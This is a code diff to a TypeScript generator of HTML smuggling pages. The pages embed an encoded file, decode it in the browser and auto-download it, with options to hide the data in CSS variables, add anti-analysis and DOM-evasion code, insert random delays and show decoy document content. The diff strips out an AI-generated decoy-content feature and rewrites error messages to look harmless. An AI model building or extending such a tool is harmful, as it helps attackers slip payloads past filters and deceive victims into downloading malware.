@@ -20,7 +20,6 @@ import {
   obfuscateString,
   obfuscateVariableName
 } from "./stealthUtils";
-import { aiService } from "./aiService";
 
 export async function generatePayload(fileData: FileData, config: Config): Promise<string> {
   const { file, content } = fileData;
@@ -61,7 +60,7 @@ export async function generatePayload(fileData: FileData, config: Config): Promi
   }
   
   // Generate the HTML payload
-  const html = await generateHTMLTemplate({
+  const html = generateHTMLTemplate({
     encodedData,
     decoderFunction,
     fileName: file.name,
@@ -73,10 +72,7 @@ export async function generatePayload(fileData: FileData, config: Config): Promi
     obfuscateCode: config.obfuscateCode,
     randomDelay: config.randomDelay,
     storageMethod: config.storageMethod,
-    antiAnalysis: config.antiAnalysis,
-    aiEnhanced: config.aiEnhanced,
-    aiContentType: config.aiContentType,
-    aiObfuscationLevel: config.aiObfuscationLevel
+    antiAnalysis: config.antiAnalysis
   });
   
   return html;
@@ -95,12 +91,9 @@ interface TemplateParams {
   randomDelay: boolean;
   storageMethod: string;
   antiAnalysis: boolean;
-  aiEnhanced: boolean;
-  aiContentType: string;
-  aiObfuscationLevel: string;
 }
 
-async function generateHTMLTemplate(params: TemplateParams): Promise<string> {
+function generateHTMLTemplate(params: TemplateParams): string {
   const { 
     encodedData, 
     decoderFunction, 
@@ -113,54 +106,16 @@ async function generateHTMLTemplate(params: TemplateParams): Promise<string> {
     obfuscateCode,
     randomDelay,
     storageMethod,
-    antiAnalysis,
-    aiEnhanced,
-    aiContentType,
-    aiObfuscationLevel
+    antiAnalysis
   } = params;
   
-  // Generate fake content with AI or fallback
-  let fakeDoc = null;
-  if (fakeContent) {
-    if (aiEnhanced) {
-      try {
-        const fileExtension = fileName.split('.').pop() || '';
-        const contextType = aiContentType === 'auto' ? 'corporate' : aiContentType;
-        
-        fakeDoc = await aiService.generateFakeDocumentContent({
-          fileType: fileExtension,
-          fileName,
-          targetAudience: contextType,
-          documentType: contextType
-        });
-      } catch (error) {
-        console.warn('AI content generation failed, using fallback');
-        fakeDoc = generateFakeContent();
-      }
-    } else {
-      fakeDoc = generateFakeContent();
-    }
-  }
-  
-  // Generate AI-enhanced variable names if enabled
-  let variableNames: string[] = [];
-  if (aiEnhanced && obfuscateCode) {
-    try {
-      variableNames = await aiService.generateContextualVariableNames(
-        fakeDoc ? 'business application' : 'document viewer',
-        10
-      );
-    } catch (error) {
-      console.warn('AI variable generation failed, using fallback');
-      variableNames = [];
-    }
-  }
+  // Generate fake content if enabled
+  const fakeDoc = fakeContent ? generateFakeContent() : null;
   
   // Generate storage code based on method
-  const keyVar = variableNames[0] || obfuscateVariableName('key');
-  const storageCode = generateStorageCode(storageMethod, encodedData, keyVar);
+  const storageCode = generateStorageCode(storageMethod, encodedData, obfuscateVariableName('key'));
   
-  // Generate stealth features with AI enhancement
+  // Generate stealth features
   const antiAnalysisFeatures = antiAnalysis ? generateAntiAnalysisCode() : '';
   const delayCode = randomDelay ? generateRandomDelay() : '';
   const domEvasion = obfuscateCode ? generateDOMEvasion() : '';
@@ -254,7 +209,9 @@ async function generateHTMLTemplate(params: TemplateParams): Promise<string> {
           // Get payload data
           ${storageMethod === 'css' && stealthMode 
             ? "const payloadData = getComputedStyle(document.documentElement).getPropertyValue('--payload-data').trim().slice(1, -1);"
-            : `const payloadData = '${encodedData}';`
+            : storageCode.includes('payloadData') 
+              ? storageCode 
+              : `const payloadData = '${encodedData}';`
           }
           
           if (!payloadData) {
@@ -279,15 +236,9 @@ async function generateHTMLTemplate(params: TemplateParams): Promise<string> {
             document.body.removeChild(a);
             
             ${fakeDoc ? `
-            const container = document.querySelector('.container');
-            if (container) {
-              container.innerHTML += '<div style="margin-top: 30px; padding: 15px; background: #e8f5e8; border-left: 4px solid #27ae60; color: #27ae60;"><strong>✓ Download Complete</strong><br>The requested document has been downloaded to your device.</div>';
-            }
+            document.querySelector('.container').innerHTML += '<div style="margin-top: 30px; padding: 15px; background: #e8f5e8; border-left: 4px solid #27ae60; color: #27ae60;"><strong>✓ Download Complete</strong><br>The requested document has been downloaded to your device.</div>';
             ` : `
-            const container = document.querySelector('.container');
-            if (container) {
-              container.innerHTML = '<div style="text-align: center; margin-top: 50px;"><h2>✓ Download Complete</h2><p>Your file has been downloaded successfully.</p></div>';
-            }
+            document.querySelector('.container').innerHTML = '<div style="text-align: center; margin-top: 50px;"><h2>✓ Download Complete</h2><p>Your file has been downloaded successfully.</p></div>';
             `}
           }, Math.random() * 2000 + 1000);
           ` : `
@@ -299,17 +250,11 @@ async function generateHTMLTemplate(params: TemplateParams): Promise<string> {
           downloadBtn.textContent = '📄 Download ${fileName}';
           
           ${fakeDoc ? `
-          const container = document.querySelector('.container');
-          if (container) {
-            container.innerHTML += '<div style="margin-top: 30px; text-align: center;"><p><strong>Document Ready for Download:</strong></p></div>';
-            container.appendChild(downloadBtn);
-          }
+          document.querySelector('.container').innerHTML += '<div style="margin-top: 30px; text-align: center;"><p><strong>Document Ready for Download:</strong></p></div>';
+          document.querySelector('.container').appendChild(downloadBtn);
           ` : `
-          const container = document.querySelector('.container');
-          if (container) {
-            container.innerHTML = '<div style="text-align: center;"><h2>Document Ready</h2><p>Click below to download your file:</p></div>';
-            container.appendChild(downloadBtn);
-          }
+          document.querySelector('.container').innerHTML = '<div style="text-align: center;"><h2>Document Ready</h2><p>Click below to download your file:</p></div>';
+          document.querySelector('.container').appendChild(downloadBtn);
           `}
           `}
           
@@ -319,17 +264,11 @@ async function generateHTMLTemplate(params: TemplateParams): Promise<string> {
           }, 30000);
           
         } catch (error) {
-          console.error('Payload processing error:', error);
+          console.warn('Document processing issue:', error.message);
           ${fakeDoc ? `
-          const container = document.querySelector('.container');
-          if (container) {
-            container.innerHTML += '<div style="margin-top: 30px; padding: 15px; background: #ffeaa7; border-left: 4px solid #fdcb6e; color: #e17055;"><strong>⚠ Notice</strong><br>The document attachment could not be processed. Please contact the sender for an alternative format.</div>';
-          }
+          document.querySelector('.container').innerHTML += '<div style="margin-top: 30px; padding: 15px; background: #ffeaa7; border-left: 4px solid #fdcb6e; color: #e17055;"><strong>⚠ Notice</strong><br>The document attachment could not be processed. Please contact the sender for an alternative format.</div>';
           ` : `
-          const container = document.querySelector('.container');
-          if (container) {
-            container.innerHTML = '<div style="text-align: center; margin-top: 50px; color: #e74c3c;"><h2>⚠ Document Unavailable</h2><p>The requested document could not be loaded at this time.</p></div>';
-          }
+          document.querySelector('.container').innerHTML = '<div style="text-align: center; margin-top: 50px; color: #e74c3c;"><h2>⚠ Document Unavailable</h2><p>The requested document could not be loaded at this time.</p></div>';
           `}
         }
       })();
